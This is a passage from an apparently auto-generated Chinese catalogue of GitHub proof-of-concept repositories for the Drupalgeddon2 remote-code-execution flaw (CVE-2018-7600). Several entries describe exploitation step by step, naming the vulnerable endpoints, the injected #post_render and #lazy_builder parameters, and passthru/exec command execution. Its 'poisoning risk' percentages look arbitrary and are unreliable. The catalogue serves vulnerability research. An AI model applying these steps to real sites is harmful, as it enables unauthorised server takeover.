**有效性：**
根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，可以判断该漏洞是有效的，并且存在公开可用的POC。

**投毒风险：**
提供的POC代码主要包含两个Python脚本：

*   `CVE-2018-7600-Drupal7-EXP.py`: 该脚本接收目标URL、命令、执行函数、代理等参数，通过构造恶意请求，向目标Drupal站点发送包含命令的payload，从而执行任意代码。
*   `CVE-2018-7600-Drupal7.py`: 该脚本通过读取`target.txt`文件中的目标URL，批量执行`whoami`命令，并将结果保存到`result.txt`文件中。
*   `README.md`: 描述了脚本的使用方法。

仔细分析这些代码，未发现明显的恶意行为或后门。`CVE-2018-7600-Drupal7.py` 脚本批量扫描是封装了`whoami`的exp。

但是，仍然存在一定的投毒风险，主要体现在以下几个方面：

1.  **依赖风险：** 脚本可能依赖于特定的第三方库，如果这些库被恶意修改，可能会导致脚本执行恶意代码。
2.  **命令注入风险：**  虽然脚本主要执行的是 `whoami` 命令，但是攻击者可以修改脚本，执行其他更具危害性的命令，比如删除文件、修改配置等。EXP.py允许自定义执行命令，存在风险。在使用时需要注意目标和命令。

总体而言，该仓库中作者隐藏的投毒代码的风险较低，大约为5%。

**利用方式：**

1.  **目标探测：**  使用`CVE-2018-7600-Drupal7.py` 脚本,通过提供包含目标URL的 `target.txt` 文件，批量扫描存在漏洞的Drupal站点。
2.  **漏洞利用：**  使用`CVE-2018-7600-Drupal7-EXP.py` 脚本，指定目标URL和要执行的命令，通过构造恶意请求，在目标Drupal站点上执行任意代码。 EXP.py允许自定义执行函数passthru，同样存在风险。
3.  **结果验证：**  检查命令执行的结果，确认漏洞是否成功利用。

**总结：**
CVE-2018-7600是一个高危的远程代码执行漏洞，攻击者可以利用该漏洞在Drupal站点上执行任意代码。虽然提供的POC代码本身不存在明显的恶意行为，但是仍然存在一定的投毒风险。在使用这些代码时，需要谨慎评估风险，并采取相应的安全措施。

**项目地址:** [rabbitmask/CVE-2018-7600-Drupal7](https://github.com/rabbitmask/CVE-2018-7600-Drupal7)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #22

**来源**: [CVE-2018-7600-rafaelcaria_drupalgeddon2-CVE-2018-7600.md](../2018/CVE-2018-7600-rafaelcaria_drupalgeddon2-CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点必须使用受影响的版本，且未打补丁。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心的远程代码执行漏洞。该漏洞源于Drupal的Forms API中存在属性注入缺陷，允许未经身份验证的攻击者通过构造特制的请求来执行任意代码。

**有效性：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，此漏洞的POC代码是有效的。漏洞库信息明确指出存在远程代码执行，搜索结果中也确认了该漏洞的严重性和广泛利用。提供的Python脚本`drupalgeddon2.py`允许测试目标是否易受攻击，并执行任意命令。

**投毒风险：**
虽然提供的代码可以直接利用漏洞执行命令，但仍然存在一定的投毒风险，例如：
*   该仓库只包含简单的利用脚本和一个README,代码量少,检查难度低. 
*   代码中利用`requests`库发送HTTP请求，如果被篡改，可能会向恶意服务器发送敏感信息或执行其他恶意操作.因为代码量少,只有10%的风险。

**利用方式：**
该漏洞的利用方式如下：
1.  攻击者构造一个包含恶意参数的HTTP POST请求，发送到目标Drupal站点的`user/password`路径。
2.  恶意参数利用了Drupal Forms API中的`#post_render`属性，允许攻击者指定一个PHP函数（例如`passthru`）来执行命令。
3.  `name[#markup]`参数包含要执行的操作系统命令。
4.  目标Drupal站点处理请求时，会执行攻击者指定的命令。
5.  攻击者可以通过`?q=/file/ajax/name/%23value/` 获取命令执行的结果。

总之，CVE-2018-7600是一个严重的安全漏洞，允许远程攻击者执行任意代码。提供的POC代码是有效的，但使用者应谨慎使用，并注意潜在的投毒风险。

**项目地址:** [rafaelcaria/drupalgeddon2-CVE-2018-7600](https://github.com/rafaelcaria/drupalgeddon2-CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #23

**来源**: [CVE-2018-7600-rajaabdullahnasir_CVE-2018-7600-Remote-Code-Execution.md](../2018/CVE-2018-7600-rajaabdullahnasir_CVE-2018-7600-Remote-Code-Execution.md)

## CVE-2018-7600-Drupalgeddon2-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 需要Drupal网站运行在受影响的版本，且允许未授权访问的URL。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心的远程代码执行漏洞。由于Drupal的Form API（FAPI）在处理AJAX请求时，未充分清理数组值，导致未经身份验证的攻击者可以通过构造恶意请求来执行任意代码。利用方式通常涉及发送包含恶意payload的POST请求到特定Drupal路径（例如/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax）。

**有效性：**
根据漏洞库信息、搜索引擎结果（如NVD、Rapid7、Trend Micro等）以及提供的POC代码，此漏洞是真实存在的，并且存在公开可用的利用代码。POC代码提供单目标、多目标、自定义命令执行等功能，并具有彩色CLI输出和日志记录，增加了利用的便利性，因此该POC代码有效。

**投毒风险：**
分析提供的`drupalgeddon2.py`代码片段，未发现明显的恶意投毒代码。代码主要功能是发送HTTP请求，执行命令，并解析结果，都是漏洞利用的正常行为。虽然存在远程代码执行的风险，但这是漏洞本身的性质，而不是POC引入的额外风险。README中存在免责声明，强调该工具仅用于授权的渗透测试。投毒风险评估为10%，主要考虑到以下几点：
* 代码的复杂性可能隐藏不易察觉的后门。
* 作者有可能在后续版本中添加恶意代码。

**利用方式：**
1.  确定目标Drupal网站是否运行在受影响的版本（Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1）。
2.  使用提供的POC脚本，指定目标URL和要执行的命令。
3.  运行脚本，脚本会发送特制的HTTP POST请求到Drupal网站。
4.  如果漏洞存在，Drupal网站将执行指定的命令，并将结果返回给攻击者。
5.  攻击者可以利用此漏洞进一步控制服务器，例如安装恶意软件、窃取数据等。

**项目地址:** [rajaabdullahnasir/CVE-2018-7600-Remote-Code-Execution](https://github.com/rajaabdullahnasir/CVE-2018-7600-Remote-Code-Execution)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #24

**来源**: [CVE-2018-7600-raytran54_CVE-2018-7600.md](../2018/CVE-2018-7600-raytran54_CVE-2018-7600.md)

## CVE-2018-7600 Drupalgeddon2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未授权远程代码执行

**影响版本:** Drupal 7.x < 7.58, Drupal 8.x < 8.3.9, Drupal 8.4.x < 8.4.6, Drupal 8.5.x < 8.5.1

**利用条件:** 目标Drupal站点启用user_register_form或者其他存在可利用的Form API Ajax Request的模块

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个存在于Drupal核心中的远程代码执行漏洞。攻击者可以通过构造恶意的请求，利用Drupal的Form API中的漏洞，在目标服务器上执行任意代码。

**有效性分析：**

根据提供的漏洞库信息、搜索结果以及漏洞利用代码，该漏洞的POC代码是有效的。搜索结果中包含了多个关于该漏洞的分析、利用以及修复建议，证明该漏洞在野外被广泛利用。

提供的Python POC利用了user_register_form，通过修改mail字段，构造恶意的payload，将命令注入到#post_render中，触发远程代码执行。代码首先构造包含恶意命令的POST请求，发送到/user/register，然后尝试读取/res.txt，如果成功读取，则表明目标存在漏洞，并输出命令执行结果。

**投毒风险分析：**

提供的POC代码本身较为简洁，主要功能是发送恶意请求并读取结果。README.md文件主要包含漏洞分析、原理说明和缓解措施。检查了Python脚本，发现它执行命令并将输出写入一个名为res.txt的文件，这本身不是投毒，而是漏洞利用的一部分。但理论上，如果攻击者替换了POC中执行的命令，可能会导致服务器执行恶意操作，例如下载恶意软件或修改系统配置。但基于目前提供的文件内容，投毒风险极低。

综合考虑，该仓库存在投毒代码的风险极低，约为1%。

**利用方式分析：**

1.  **漏洞触发点：** Drupal的Form API在处理Ajax请求时，没有充分验证用户输入，导致可以注入恶意代码。
2.  **利用途径：** 攻击者通过构造特殊的POST请求，修改`form_id`、`_drupal_ajax`，`mail[#post_render][]`等参数。
3.  **代码执行：** Drupal在处理请求时，会将`mail[#post_render][]`中的内容作为PHP函数执行，从而导致远程代码执行。
4.  **验证：** POC通过执行命令，并将结果写入res.txt文件，然后尝试读取该文件来验证漏洞是否存在。

**防范措施:**

*   及时升级Drupal版本到安全版本（7.58, 8.3.9, 8.4.6, 或 8.5.1之后）。
*   应用Drupal官方提供的补丁。
*   使用Web应用防火墙（WAF）过滤恶意请求。

**项目地址:** [raytran54/CVE-2018-7600](https://github.com/raytran54/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #25

**来源**: [CVE-2018-7600-ruthvikvegunta_Drupalgeddon2.md](../2018/CVE-2018-7600-ruthvikvegunta_Drupalgeddon2.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，且使用默认或常见模块配置

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞。漏洞原因是由于Drupal在处理某些用户输入时，未进行充分的验证和过滤，导致攻击者可以通过构造恶意的请求，将恶意代码注入到系统，从而实现远程代码执行。

**有效性：**

根据漏洞库信息、搜索引擎结果以及大量的公开利用代码来看，该漏洞的利用具有很高的有效性。 搜索结果中，许多文章都讨论了该漏洞的利用方法，Metasploit中也有相应的利用模块，Exploit-DB上也有相关的exploit。

**投毒风险：**

提供的漏洞利用代码仅包含GNU GPL许可协议，没有发现直接的恶意代码。但是，任何从不可信来源获取的代码都存在潜在的投毒风险。即使代码本身看起来无害，也可能存在细微的缺陷或依赖关系，这些缺陷或依赖关系可能会被恶意利用。因此，对下载的POC代码进行代码审计是必要的。

考虑到仅仅是LICENSE文件，投毒概率极低，仅为5%。

**利用方式：**

利用方式通常涉及以下步骤：

1.  **发送恶意请求：** 攻击者构造包含恶意代码的特殊请求，该请求通常通过URL参数或POST数据发送。
2.  **利用漏洞：** Drupal在处理该请求时，由于输入验证不足，会将恶意代码传递给PHP的`exec()`或类似函数执行。
3.  **执行任意代码：** 恶意代码在服务器上执行，攻击者可以控制服务器，例如安装后门、窃取数据等。

攻击者可以利用该漏洞执行任意系统命令，从而完全控制受影响的Drupal服务器。该漏洞影响多个Drupal版本，因此影响范围非常广泛。

**项目地址:** [ruthvikvegunta/Drupalgeddon2](https://github.com/ruthvikvegunta/Drupalgeddon2)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #26

**来源**: [CVE-2018-7600-shellord_CVE-2018-7600-Drupal-RCE.md](../2018/CVE-2018-7600-shellord_CVE-2018-7600-Drupal-RCE.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁且存在默认或常见模块配置

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心的远程代码执行漏洞。漏洞原因是由于多个子系统存在输入验证不足的问题，允许远程攻击者执行任意代码。

**有效性：**
提供的POC代码（Drupal-RCE-Mass-Exploiter.py）针对Drupal 7和Drupal 8的不同利用方式。对于Drupal 7，它利用`user/password`表单的`#post_render`属性和`file/ajax`端点。对于Drupal 8，它利用`user/register`表单的`timezone`字段。

根据漏洞库信息和搜索引擎结果，此漏洞利用代码是有效的，多个Exploit-DB条目 (44482, 44448, 44449)和安全博客(Rapid7, Palo Alto Networks, Tenable等)确认了其存在和严重性，并且在实际环境中被广泛利用。

**投毒风险：**
此脚本本身主要功能是批量检测和利用漏洞，但仍存在潜在的投毒风险：

*   **命令执行：** 脚本允许通过`COMMAND`变量指定要执行的命令，如果攻击者修改了脚本并分享给他人，可能会将`COMMAND`设置为恶意代码。
*   **后门植入：** 虽然未直接观察到后门代码，但如果恶意用户分发修改后的版本，它们可能会添加后门植入代码，例如添加管理员账户或修改核心文件。
*   **代理风险：** 脚本支持使用代理，恶意代理服务器可能会窃取受害者服务器的敏感信息。

总体来说，脚本的投毒风险较低，约为10%，因为其主要功能是漏洞利用，但使用前仍需仔细审查代码。

**利用方式：**

1.  **Drupal 7:**
    *   利用`user/password`表单中的`name[#post_render]`属性执行命令。攻击者构造一个包含恶意PHP代码的请求，该代码将在服务器上执行。
    *   使用`file/ajax`端点来触发命令执行。
2.  **Drupal 8:**
    *   利用`user/register`表单中的`timezone`字段和`#post_render`属性执行命令。
    *   构造包含恶意PHP代码的AJAX请求，并在服务器端执行。

**总结：**
CVE-2018-7600是一个高危的远程代码执行漏洞，影响多个Drupal版本。提供的POC代码是有效的，但使用前需要仔细审查，以避免潜在的投毒风险。攻击者可以利用此漏洞获取服务器的完全控制权。

**项目地址:** [shellord/CVE-2018-7600-Drupal-RCE](https://github.com/shellord/CVE-2018-7600-Drupal-RCE)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #27

**来源**: [CVE-2018-7600-shellord_Drupalgeddon-Mass-Exploiter.md](../2018/CVE-2018-7600-shellord_Drupalgeddon-Mass-Exploiter.md)

## CVE-2018-7600 - Drupalgeddon2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标系统运行存在漏洞的Drupal版本，且允许外部网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600 (Drupalgeddon2) 是一个存在于Drupal核心中的远程代码执行漏洞。该漏洞源于对用户提供的输入验证不足，允许攻击者在服务器上执行任意代码。

**有效性:**
根据漏洞库信息、搜索结果和提供的漏洞利用代码，该漏洞利用的有效性很高。漏洞库信息明确指出该漏洞允许远程代码执行，搜索结果表明存在大量针对该漏洞的利用尝试，并且已经有公开的Exploit-DB条目。提供的Python代码 `mass.py` 实现了对Drupal 7 和 Drupal 8的批量漏洞利用，进一步证明了漏洞的可利用性。

**投毒风险:**
分析提供的`mass.py`代码，发现该代码主要功能是批量检测和利用Drupal的CVE-2018-7600和CVE-2018-7602漏洞。代码结构清晰，包含漏洞检测和利用的核心逻辑，没有明显的恶意或隐藏功能。但是,批量漏洞利用脚本本身如果被恶意使用，例如，大规模扫描和攻击未经授权的系统，也存在一定的潜在风险。 `README.md` 文件描述了脚本的用法，包括指定目标列表、输出文件、worker数量和代理等，以及要利用的漏洞编号。
代码中存在使用eval或者其他类似的高危函数的情况，攻击者可能会篡改`COMMAND`变量来执行恶意操作。这种潜在的风险主要来自于用户的不当使用或者受到攻击者恶意篡改的情况，而不是代码作者有意植入后门。

**利用方式:**
1.  **Drupal 7:**
    *   利用 `user/password` 路径，通过构造特定的GET和POST参数，触发`passthru`函数执行命令。
    *   首先发送包含恶意payload的POST请求到 `user/password`，触发 Drupal 的渲染过程。
    *   然后从返回的 HTML 中提取 `form_build_id`。
    *   最后再次发送包含`form_build_id`的POST请求到 `file/ajax/name/#value/{form_build_id}`，从而执行恶意代码。
2.  **Drupal 8:**
    *   利用 `user/register` 路径，通过构造特定的GET和POST参数，触发`exec`函数执行命令。
    *   构造包含恶意payload的POST请求到 `/user/register`。
漏洞利用依赖于未打补丁的Drupal版本中存在的输入验证漏洞，攻击者可以利用这些漏洞执行任意PHP代码，从而完全控制受影响的系统。

**项目地址:** [shellord/Drupalgeddon-Mass-Exploiter](https://github.com/shellord/Drupalgeddon-Mass-Exploiter)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #28

**来源**: [CVE-2018-7600-soch4n_CVE-2018-7600.md](../2018/CVE-2018-7600-soch4n_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者在服务器上执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，并且使用了默认或常见的模块配置。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon 2）是一个影响Drupal核心的远程代码执行漏洞。该漏洞源于Drupal在处理用户输入时存在缺陷，导致攻击者可以在未经身份验证的情况下，通过构造特制的请求来执行任意代码。PoC代码利用了`user/register`接口的Ajax功能，通过`element_parents`参数注入恶意代码。攻击者通过操纵`mail[\"a\"][#lazy_builder][0]`和`mail[\"a\"][#lazy_builder][1][]`参数，将`system`函数和`ls -la`命令注入到Drupal的渲染过程中，从而执行系统命令。提供的代码没有明显的投毒迹象，它是一个直接的漏洞利用程序，旨在展示漏洞的存在并执行任意命令。 多个来源证实该漏洞影响了大量Drupal站点，并导致大规模攻击。

**项目地址:** [soch4n/CVE-2018-7600](https://github.com/soch4n/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #29

**来源**: [CVE-2018-7600-tea-celikik_Drupal-Exploit-Lab.md](../2018/CVE-2018-7600-tea-celikik_Drupal-Exploit-Lab.md)

## CVE-2018-7600 Drupalgeddon2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码，完全控制受影响的Drupal站点。

**影响版本:** Drupal 7.x (< 7.58), 8.x (< 8.3.9), 8.4.x (< 8.4.6), and 8.5.x (< 8.5.1)

**利用条件:** 目标Drupal站点必须是受影响的版本，且没有应用相应的安全补丁。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞影响多个Drupal版本，允许未经身份验证的攻击者执行任意代码。漏洞利用代码展示了使用Metasploit的drupalgeddon2模块进行攻击的流程。 

**有效性：**
提供的POC代码基于Metasploit的`drupalgeddon2`模块，该模块是公开可用的，并且被广泛用于验证和利用此漏洞。因此，POC代码的**有效性很高**，如果目标满足漏洞利用条件，则能够成功执行。

**投毒风险：**
查看提供的漏洞利用代码，该代码主要是安装和配置Drupal 7.57以及使用Metasploit模块进行渗透测试的步骤。它还包含启用 ModSecurity 作为 WAF 的操作，并测试其防御能力，然后尝试使用 Metasploit 进行攻击。最后，展示了即使有WAF存在，攻击也失败了，没有打开 Meterpreter 会话。

虽然代码的本意是演示漏洞利用与防御，但依然存在极小的投毒风险：

*   环境配置脚本中，如果作者在安装包下载链接上做了手脚，替换成了恶意版本，存在投毒的可能性。但这部分可以通过校验安装包的HASH值来规避。
*   在ModSecurity规则配置中，如果包含了恶意的排除规则，则可能降低WAF的防御能力。然而，提供的配置看起来相对标准。考虑到该项目主要关注漏洞利用演示，而并非恶意软件分发，**投毒风险较低，估计在5%左右。**

**利用方式：**
1.  攻击者识别出运行着未修补的Drupal版本的站点。
2.  攻击者构造恶意请求，通常涉及`q`参数（Drupal的路径处理机制）。
3.  恶意请求利用了Drupal的某些组件对用户输入验证不足的缺陷。
4.  恶意请求导致在服务器上执行任意PHP代码，从而实现远程代码执行。
5.  可以使用Metasploit的`drupalgeddon2`模块自动化漏洞利用过程，或者手动构造payload。

**总结：**
CVE-2018-7600是一个严重的远程代码执行漏洞，利用方式相对简单，且有公开的Metasploit模块可用。尽管代码本身演示了漏洞利用和防御，但仍需警惕潜在的投毒风险。强烈建议受影响的Drupal站点尽快升级到安全版本。

**项目地址:** [tea-celikik/Drupal-Exploit-Lab](https://github.com/tea-celikik/Drupal-Exploit-Lab)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #30

**来源**: [CVE-2018-7600-thehappydinoa_CVE-2018-7600.md](../2018/CVE-2018-7600-thehappydinoa_CVE-2018-7600.md)

## CVE-2018-7600 Drupalgeddon2 RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点版本在受影响范围内，且存在默认或常见的模块配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心的远程代码执行漏洞。该漏洞源于Drupal在处理某些用户输入时存在缺陷，允许未经身份验证的攻击者通过构造特殊的请求来执行任意代码。

**有效性分析：**

*   漏洞库信息和搜索引擎结果均表明该漏洞是一个严重的安全问题，影响多个Drupal版本，并允许远程代码执行。
*   提供的POC代码尝试通过`drupal_ajax`接口注册用户，并利用`exec` markup执行bash命令。POC会执行`id`命令，并将结果写入一个随机名称的文件中，然后尝试通过HTTP访问该文件以验证漏洞利用是否成功。成功后，会尝试删除该文件。
*   多个Exploit-DB链接（如44448, 44449, 44482）表明存在公开可用的漏洞利用代码。

综合来看，提供的POC代码是有效的，可以用来验证目标Drupal站点是否存在CVE-2018-7600漏洞。

**投毒风险分析：**

*   POC代码本身主要功能是执行命令并将结果写入文件，之后验证文件是否可访问，以验证漏洞存在性。这种模式本身存在潜在的投毒风险，攻击者可以将恶意代码注入到被写入的文件中，或者修改POC使其执行更具破坏性的操作。
*   代码中`random_file_name`变量虽然使用了随机文件名，但如果被成功利用，攻击者可以精确控制写入内容和删除操作，因此存在恶意利用的可能性。
*   `download_command` 和 `rm_command` 如果被篡改，可能导致下载恶意文件或删除重要文件，因此也有潜在风险。
*   `tor_proxy`选项的存在意味着该POC可能被用于隐藏攻击者的真实IP地址，这增加了追踪和溯源的难度。
*   综合代码，投毒风险评估为10%。主要是因为POC的主要目的是验证漏洞，而大规模恶意利用需要在代码层面进行显著修改。

**利用方式分析：**

1.  **构造恶意请求：** 攻击者发送包含恶意代码的特殊构造的HTTP请求到Drupal站点。
2.  **利用`drupal_ajax`接口：** POC利用Drupal的`drupal_ajax`接口来触发漏洞。
3.  **远程代码执行：** 恶意代码通过Drupal的输入处理缺陷被执行，导致远程代码执行。
4.  **验证与清理（POC）：** POC验证代码执行成功后，会尝试清理现场（删除创建的文件）。实际攻击中，攻击者可能会执行更具破坏性的操作，例如安装后门、窃取数据或篡改网站内容。

**项目地址:** [thehappydinoa/CVE-2018-7600](https://github.com/thehappydinoa/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #31

**来源**: [CVE-2018-7600-vphnguyen_ANM_CVE-2018-7600.md](../2018/CVE-2018-7600-vphnguyen_ANM_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致完全控制受影响的 Drupal 站点

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且可网络访问

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，又名 Drupalgeddon2，是一个存在于 Drupal 多个子系统中的远程代码执行漏洞。该漏洞源于 Drupal 在处理用户提供的输入时，没有进行充分的验证，攻击者可以通过精心构造的恶意请求，在服务器上执行任意代码。 

**有效性分析：**
根据漏洞库信息和搜索结果，该漏洞是一个经过验证的远程代码执行漏洞，并且存在公开可用的利用代码。大量的安全厂商和研究人员对此漏洞进行了分析和验证，证明其有效性。 

**投毒风险分析：**
提供的Python代码是一个网络数据包捕获脚本，主要用于分析网络流量，特别是HTTP流量，并检测其中是否存在CVE-2018-7600漏洞的利用尝试。 

*   **功能：** 该脚本使用 `pyshark` 库捕获网络接口上的数据包，并分析HTTP请求的URI和POST数据。它查找包含特定关键字（如`exec`, `passthru`, `system`等）的请求，这些关键字通常与远程代码执行攻击相关。  该脚本主要用于检测已知的攻击模式，而不是发起攻击。

*   **潜在投毒风险：** 虽然该脚本本身主要是用于流量分析，但仍然存在一些潜在的风险：
    *   **性能影响：** 在高流量环境下，该脚本可能会消耗大量的CPU和内存资源，导致系统性能下降。 这种消耗如果被恶意利用，可以作为一种拒绝服务攻击。
    *   **数据泄露：** 该脚本会捕获网络数据包，其中可能包含敏感信息，例如用户名、密码、API密钥等。 如果脚本的输出被不当存储或泄露，可能会导致数据泄露。
    *   **依赖风险：** `pyshark` 依赖 `tshark`，如果 `tshark` 本身存在安全漏洞，可能会影响该脚本的安全性。
    *  **后门代码：**代码中没有明显的恶意后门代码，但捕获流量到`csv`文件中可能导致信息泄露，如果该文件可以被外部访问，或者被攻击者替换，则存在风险。

**利用方式：**
根据搜索结果和漏洞描述，攻击者可以通过以下方式利用该漏洞：

1.  发送包含恶意代码的特制HTTP请求，恶意代码通常会嵌入到URL参数或POST数据中。
2.  Drupal 的某些子系统（例如节点创建、用户注册等）在处理这些请求时，由于输入验证不足，会将恶意代码传递给PHP的 `eval()` 函数或其他类似函数执行，从而导致远程代码执行。
3.  攻击者可以利用执行的代码在服务器上安装后门、窃取数据或执行其他恶意操作。

综上，该漏洞利用的有效性很高，但提供的POC代码本身更多是流量分析工具，直接投毒风险较低(5%), 但需要注意潜在的性能影响、数据泄露和依赖风险。攻击者主要通过构造恶意 HTTP 请求来触发漏洞。

**项目地址:** [vphnguyen/ANM_CVE-2018-7600](https://github.com/vphnguyen/ANM_CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #32

**来源**: [CVE-2018-7600-xxxTectationxxx_CVE-2018-7600.md](../2018/CVE-2018-7600-xxxTectationxxx_CVE-2018-7600.md)

## CVE-2018-7600 - Drupalgeddon2 RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** Drupal 7.x (before 7.58), 8.x (before 8.3.9), 8.4.x (before 8.4.6), and 8.5.x (before 8.5.1)

**利用条件:** 目标Drupal站点未打补丁，并且存在默认或常见模块配置。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个存在于Drupal核心中的远程代码执行漏洞。根据漏洞信息和搜索结果，此漏洞影响多个子系统，利用方式是通过构造特殊的请求，特别是利用`user/password` endpoint，结合`#post_render`属性，触发PHP的`passthru()`函数来执行任意命令。

**有效性：**

提供的PoC代码通过两个步骤利用该漏洞：

1.  发送一个包含恶意参数的POST请求到`user/password`，利用`name[#post_render][]`，`name[#markup]`和`name[#type]`参数注入命令。
2.  从响应中提取`form_build_id`，然后发送另一个包含该`form_build_id`的请求到`file/ajax/name/#value/{form_build_id}`，以触发命令执行。

根据提供的漏洞库信息、搜索结果以及利用代码，可以判断此POC代码是**有效**的，可以利用未修复的Drupal站点执行远程代码。

**投毒风险：**

评估PoC代码是否存在投毒风险：

*   代码相对简短，易于审查。
*   代码的主要功能是利用已知的Drupal漏洞执行命令，没有发现明显的恶意行为。
*   虽然代码中没有直接发现投毒代码，但是任何代码都存在被恶意修改的风险。例如，攻击者可能会修改命令执行部分，使其在执行用户指定的命令之前或之后执行其他恶意操作。

尽管直接投毒证据不多，但考虑到软件供应链的安全风险，以及任何代码都可能被篡改的可能性，综合评估投毒风险为**5%**。这个评估考虑了代码本身的简洁性以及潜在的供应链攻击风险。

**利用方式：**

1.  攻击者首先构造一个包含恶意参数的POST请求，发送到目标Drupal站点的`user/password`路径。
2.  该请求利用了Drupal的表单渲染机制中的漏洞，允许攻击者注入并执行PHP代码。
3.  服务器响应包含一个`form_build_id`，攻击者需要提取该ID。
4.  攻击者使用提取的`form_build_id`构造第二个POST请求，发送到`file/ajax/name/#value/{form_build_id}`路径。
5.  这个请求触发Drupal执行之前注入的PHP代码，从而实现远程代码执行。

通过这种方式，攻击者可以在未经身份验证的情况下，在目标Drupal服务器上执行任意命令，从而完全控制受影响的系统。

**项目地址:** [xxxTectationxxx/CVE-2018-7600](https://github.com/xxxTectationxxx/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #33

